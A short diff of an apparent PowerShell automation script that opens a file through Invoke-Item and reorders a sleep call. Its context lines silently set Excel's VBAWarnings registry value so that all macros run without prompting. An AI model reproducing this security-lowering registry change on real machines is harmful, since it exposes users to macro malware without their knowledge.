@@ -9,8 +9,8 @@ Function OpenAndRunZG {
     $excl = New-Object -ComObject Excel.Application
     #$excl.Visible = $true
     #$excl.Workbooks.Open($Path)
-    Start-Sleep -s 5
     Invoke-Item $Path
+    Start-Sleep -s 5
     New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null
     Start-Sleep -s 20
     $popup = New-Object -ComObject wscript.shell
@@ -26,8 +26,8 @@ Function OpenAndRunZG_WD{
     $excl = New-Object -ComObject Excel.Application
     #$excl.Visible = $true
     #$excl.Workbooks.Open($Path)
-    Start-Sleep -s 5
     Invoke-Item $Path
+    Start-Sleep -s 5
     New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null
     Start-Sleep -s 20
     $popup = New-Object -ComObject wscript.shell
